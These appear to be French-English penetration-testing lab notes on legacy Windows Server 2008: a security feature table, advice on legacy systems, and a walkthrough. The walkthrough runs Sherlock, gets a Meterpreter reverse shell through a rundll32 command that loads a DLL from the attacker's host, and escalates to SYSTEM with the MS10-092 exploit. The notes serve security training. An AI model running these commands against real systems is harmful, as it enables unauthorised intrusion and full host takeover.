# Windows Server

***

Windows Server 2008 / 2008 R2 ont été déclarés en fin de vie le 14 janvier 2020. Au fil des années, Microsoft a intégré des fonctionnalités de sécurité renforcées dans les versions suivantes de Windows Server. Il est peu fréquent de croiser des systèmes Server 2008 lors de tests d’intrusion externes, mais je les rencontre souvent lors d’évaluations internes.

***

### <mark style="color:$danger;">Server 2008 vs. Newer Versions</mark>

The table below shows some notable differences between Server 2008 and the latest Windows Server versions.

<table data-full-width="true"><thead><tr><th>Feature</th><th>Server 2008 R2</th><th>Server 2012 R2</th><th>Server 2016</th><th>Server 2019</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection">Enhanced Windows Defender Advanced Threat Protection (ATP)</a></td><td></td><td></td><td></td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">Just Enough Administration</a></td><td>Partial</td><td>Partial</td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td><td></td><td></td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td><td></td><td></td><td>X</td><td>X</td></tr><tr><td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td><td></td><td></td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td><td>Partial</td><td>X</td><td>X</td><td>X</td></tr><tr><td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td><td>Partial</td><td>Partial</td><td>X</td><td>X</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td><td></td><td></td><td>X</td><td>X</td></tr></tbody></table>

{% hint style="warning" %}
**Features**

* **Enhanced Windows Defender ATP** : Protection avancée contre les menaces (analyse comportementale, détection post-exploitation, réponse automatisée).
* **Just Enough Administration (JEA)** : Permet un accès minimal aux fonctions d'administration, limitant les privilèges.
* **Credential Guard** : Protège les informations d'identification contre le vol (isolation avec la virtualisation).
* **Remote Credential Guard** : Permet d'utiliser les identifiants d’un utilisateur sur un serveur distant sans les transmettre complètement.
* **Device Guard** : Garantit que seuls les binaires approuvés s’exécutent (protection d’intégrité du code).
* **AppLocker** : Contrôle quelles applications peuvent être lancées sur un poste.
* **Windows Defender** : Antivirus et antimalware intégré à Windows.
* **Control Flow Guard (CFG)** : Mécanisme de protection contre l’exécution de code malveillant par détournement de flux.
{% endhint %}

***

### <mark style="color:red;">Server 2008 Case Study</mark>

#### 🔍 1. **Fréquence de rencontre**

* Les **systèmes legacy** (Windows / Linux) sont encore courants en audit interne.
* Parfois oubliés, parfois **critiques et non remplaçables** (ex. logiciels médicaux).

#### 🧠 2. **Importance de comprendre le contexte métier**

* Toujours **discuter avec le client** : comprendre pourquoi ces systèmes sont encore là.
* Une **recommandation générique ("retirer le système") n'est pas toujours adaptée**.
* Exemples : logiciels d’IRM sur XP/Server 2003, contraintes budgétaires, etc.

#### 🛡️ 3. **Mesures compensatoires possibles**

* Segmentation réseau stricte 🔒
* Support étendu personnalisé 🛠️
* Accès restreint, surveillance renforcée 🔍

#### 🚨 4. **Impact réglementaire**

* Dans certains environnements soumis à audit, un seul système legacy peut :
  * Faire **échouer un audit**
  * **Retarder ou faire perdre** des financements publics

#### 🧰 5. **Outils pour analyser un Windows Server 2008**

* **Sherlock** : identifie les failles locales connues (LPE).
* **Windows-Exploit-Suggester** :
  * Analyse la sortie `systeminfo`
  * Compare avec les vulnérabilités connues Microsoft
  * Propose des exploits Metasploit si applicables
* ⚠️ Utilisation manuelle parfois nécessaire si les outils ne peuvent être exécutés sur la cible.

<mark style="color:green;">**Querying Current Patch Level**</mark>

```cmd-session
C:\htb> wmic qfe
```

A quick Google search of the last installed hotfix shows us that this system is very far out of date.

<mark style="color:green;">**Running Sherlock**</mark>

```powershell-session
PS C:\htb> Set-ExecutionPolicy bypass -Scope process


PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns
```

<mark style="color:green;">**Obtaining a Meterpreter Shell**</mark>

```shell-session
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery

msf6 exploit(windows/smb/smb_delivery) > use 0

msf6 exploit(windows/smb/smb_delivery) > show options 


msf6 exploit(windows/smb/smb_delivery) > show targets


msf6 exploit(windows/smb/smb_delivery) > set target 0

msf6 exploit(windows/smb/smb_delivery) > exploit 

```

<mark style="color:green;">**Rundll Command on Target Host**</mark>

```cmd-session
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

<mark style="color:green;">**Receiving Reverse Shell**</mark>

```shell-session
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```

<mark style="color:green;">**Searching for Local Privilege Escalation Exploit**</mark>

From here, let's search for the [MS10\_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) module.

```shell-session
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
```

<mark style="color:green;">**Migrating to a 64-bit Process**</mark>

Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the `smb_delivery` step.

```shell-session
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > getpid

Current pid: 2268


meterpreter > ps

meterpreter > migrate 2796

meterpreter > background

[*] Backgrounding session 1...
```

<mark style="color:green;">**Setting Privilege Escalation Module Options**</mark>

Once this is set, we can now set up the privilege escalation module by specifying our current Meterpreter session, setting our tun0 IP for the LHOST, and a call-back port of our choosing.

```shell-session
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1

SESSION => 1


msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3

lhost => 10.10.14.3


msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443

lport => 4443


msf6 exploit(windows/local/ms10_092_schelevator) > show options
```

<mark style="color:green;">**Receiving Elevated Reverse Shell**</mark>

If all goes to plan, once we type `exploit`, we will receive a new Meterpreter shell as the `NT AUTHORITY\SYSTEM` account and can move on to perform any necessary post-exploitation.

```shell-session
msf6 exploit(windows/local/ms10_092_schelevator) > exploit
```

***
